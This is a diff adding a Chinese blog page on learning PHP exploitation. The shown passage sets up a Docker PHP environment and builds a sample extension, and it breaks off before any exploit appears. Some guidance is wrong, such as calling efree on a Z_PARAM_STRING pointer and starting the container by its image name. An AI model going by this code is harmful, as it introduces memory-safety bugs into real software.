@@ -1,0 +1,1056 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="Findkey">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://find-key.github.io/2026/04/02/php-pwn/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从零开始的 PHP PWN 学习">
+<meta property="og:url" content="https://find-key.github.io/2026/04/02/php-pwn/index.html">
+<meta property="og:site_name" content="Find-key&#39;Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://find-key.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-04-02T10:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-03T04:38:45.184Z">
+<meta property="article:author" content="Find-key">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://find-key.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            从零开始的 PHP PWN 学习 | Findkey&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"find-key.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"To Be PWN Master.","subtitle":{"text":[],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":[{"icon":"fa-brands fa-github","url":"https://github.com/Find-key"},{"icon":"fa-solid fa-at","url":"Find_key@foxmail.com"},{"icon":"fa-solid fa-at","url":null},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":null}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Friends":{"path":"/links/","icon":"fa-solid fa-link"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"为之则易，不为则难","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Findkey&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-solid fa-link fa-fw"></i>
+                                    FRIENDS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                FRIENDS
+                            </span>
+                            
+                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">从零开始的 PHP PWN 学习</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/head_image.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Findkey</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-04-02 18:00</span>
+        <span class="mobile">2026-04-02 18:00</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-04-03 12:38:45</span>
+            <span class="mobile">2026-04-03 12:38:45</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
+<p>搭环境是开始的第一步</p>
+</blockquote>
+<h3 id="docker-环境"><a href="#docker-环境" class="headerlink" title="docker 环境"></a>docker 环境</h3><p>写 dockerfile</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM php:8.1-apache</span><br><span class="line"></span><br><span class="line">RUN apt update &amp;&amp; \</span><br><span class="line">    apt install -y build-essential vim</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br></pre></td></tr></table></figure></div>
+
+<p>构建</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t php81-apache .</span><br></pre></td></tr></table></figure></div>
+
+<p>挂载本地目录</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -it \</span><br><span class="line">-d \</span><br><span class="line">-v ./Dev:/workspace \</span><br><span class="line">-v ./Src:/var/www/html \</span><br><span class="line">-p 1724:80 \</span><br><span class="line">-w /workspace \</span><br><span class="line">--name php81 \</span><br><span class="line">--hostname php81 \</span><br><span class="line">php81-apache</span><br></pre></td></tr></table></figure></div>
+
+
+<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker start php81-apache</span><br><span class="line">docker <span class="built_in">exec</span> -it php81-apache bash</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="编写-PHP-拓展"><a href="#编写-PHP-拓展" class="headerlink" title="编写 PHP 拓展"></a>编写 PHP 拓展</h2><blockquote>
+<p>搭建好环境就可以自己写拓展了，这和出题一样</p>
+</blockquote>
+<h3 id="解压-php-源码"><a href="#解压-php-源码" class="headerlink" title="解压 php 源码"></a>解压 php 源码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/src</span><br><span class="line">tar -xvf ./php.tar.xz</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="生成拓展模板"><a href="#生成拓展模板" class="headerlink" title="生成拓展模板"></a>生成拓展模板</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd php-8.1.34/ext</span><br><span class="line"></span><br><span class="line"># 在 /workspace 生成了一个名为 apple 的拓展模板</span><br><span class="line">./ext_skel.php --ext apple --dir /workspace/</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="权限修改"><a href="#权限修改" class="headerlink" title="权限修改"></a>权限修改</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /workspace/apple</span><br><span class="line">chmod -R ugo+rw apple</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
+
+<p>从回显中注意到安装目录<br><em>Installing shared extensions:     &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;no-debug-non-zts-20210902&#x2F;</em></p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/local/etc/php/php.ini-development /usr/local/etc/php/php.ini</span><br></pre></td></tr></table></figure></div>
+
+<p>然后修改 php.ini<br>在最末尾加上</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=apple.so</span><br></pre></td></tr></table></figure></div>
+
+<p>在容器的 &#x2F;var&#x2F;www&#x2F;html ，创建一个 index.php，内容是</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">  <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>然后访问，发现页面中有 apple 部分的信息</p>
+<h3 id="自定义内容"><a href="#自定义内容" class="headerlink" title="自定义内容"></a>自定义内容</h3><h4 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h4><p>由于 C 和 PHP 的类型不同，编写拓展时，需要先解析参数。ZEND_PARSE_PARAMETERS_START 和 ZEND_PARSE_PARAMETERS_END 是参数解析的核心。Z_PARAM_XXX 系列宏用于指定参数类型。</p>
+<p>类型解析如下</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>宏</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>long</td>
+<td>Z_PARAM_LONG</td>
+<td>整数</td>
+</tr>
+<tr>
+<td>double</td>
+<td>Z_PARAM_DOUBLE</td>
+<td>浮点数</td>
+</tr>
+<tr>
+<td>string</td>
+<td>Z_PARAM_STRING</td>
+<td>字符串，需要手动释放内存</td>
+</tr>
+<tr>
+<td>string</td>
+<td>(copy)	Z_PARAM_STR</td>
+<td>字符串，自动拷贝，不需要手动释放内存</td>
+</tr>
+<tr>
+<td>bool</td>
+<td>Z_PARAM_BOOL</td>
+<td>布尔值</td>
+</tr>
+<tr>
+<td>array</td>
+<td>Z_PARAM_ARRAY</td>
+<td>数组</td>
+</tr>
+<tr>
+<td>object</td>
+<td>Z_PARAM_OBJECT</td>
+<td>对象</td>
+</tr>
+<tr>
+<td>resource</td>
+<td>Z_PARAM_RESOURCE</td>
+<td>资源</td>
+</tr>
+<tr>
+<td>null</td>
+<td>Z_PARAM_NULL</td>
+<td>NULL 值</td>
+</tr>
+<tr>
+<td>is_null</td>
+<td>Z_PARAM_ZVAL</td>
+<td>任意类型，需要使用 Z_ISNULL 宏判断是否为 NULL</td>
+</tr>
+</tbody></table>
+<p>例如：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(my_function)</span><br><span class="line">&#123;</span><br><span class="line">    zend_long a;</span><br><span class="line">    double b;</span><br><span class="line">    char *str;</span><br><span class="line">    size_t str_len;</span><br><span class="line"></span><br><span class="line">    ZEND_PARSE_PARAMETERS_START(2, 3)</span><br><span class="line">        Z_PARAM_LONG(a)</span><br><span class="line">        Z_PARAM_DOUBLE(b)</span><br><span class="line">        Z_PARAM_OPTIONAL</span><br><span class="line">        Z_PARAM_STRING(str, str_len)</span><br><span class="line">    ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">    // ... 使用 a, b, str ...</span><br><span class="line"></span><br><span class="line">    efree(str); // 释放字符串内存</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>ZEND_PARSE_PARAMETERS_START(2, 3) 表示开始参数解析，第一个参数是最少的参数类型，第二个表示最多的参数类型。<br>Z_PARAM_OPTIONAL 表示可选程序，从这个宏开始，下面内容是可选的</p>
+<p>然后是返回值，RETURN_XXX 系列宏用于返回不同类型的值。</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>宏</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>long</td>
+<td>RETURN_LONG</td>
+<td>整数</td>
+</tr>
+<tr>
+<td>double</td>
+<td>RETURN_DOUBLE</td>
+<td>浮点数</td>
+</tr>
+<tr>
+<td>string</td>
+<td>RETURN_STRING</td>
+<td>字符串，需要手动拷贝字符串</td>
+</tr>
+<tr>
+<td>string</td>
+<td>(copy)	RETURN_STR</td>
+<td>字符串，自动拷贝，不需要手动释放内存</td>
+</tr>
+<tr>
+<td>bool</td>
+<td>RETURN_TRUE, RETURN_FALSE</td>
+<td>布尔值</td>
+</tr>
+<tr>
+<td>array</td>
+<td>RETURN_ARR</td>
+<td>数组，返回的是 zend_array * 指针，需要先创建 zend_array 结构体</td>
+</tr>
+<tr>
+<td>object</td>
+<td>RETURN_OBJ</td>
+<td>对象，返回的是 zend_object * 指针，需要先创建 zend_object 结构体</td>
+</tr>
+<tr>
+<td>resource</td>
+<td>RETURN_RES</td>
+<td>资源，返回的是 zend_resource * 指针，需要先创建 zend_resource 结构体</td>
+</tr>
+<tr>
+<td>null</td>
+<td>RETURN_NULL</td>
+<td>NULL 值</td>
+</tr>
+<tr>
+<td>void</td>
+<td>RETURN_VOID</td>
+<td>没有返回值</td>
+</tr>
+</tbody></table>
+<h4 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h4><p>修改 apple.stub.php ，声明函数</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Recall</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$str</span> = <span class="string">&quot;&quot;</span></span>): <span class="title">void</span> </span>&#123;&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p>然后运行 <code>php /usr/src/php-8.1.34/build/gen_stub.php --ext=apple ./apple.stub.php</code><br>这一步会在 apple_arginfo.h 添加一些函数声明的内容。</p>
+<p>找到源码 apple.c ，开始添加内容</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">PHP_FUNCTION(Recall)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *str = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> str_len = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">       	Z_PARAM_STRING(str, str_len)</span><br><span class="line">    ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (str) &#123;</span><br><span class="line">       	php_printf(<span class="string">&quot;You 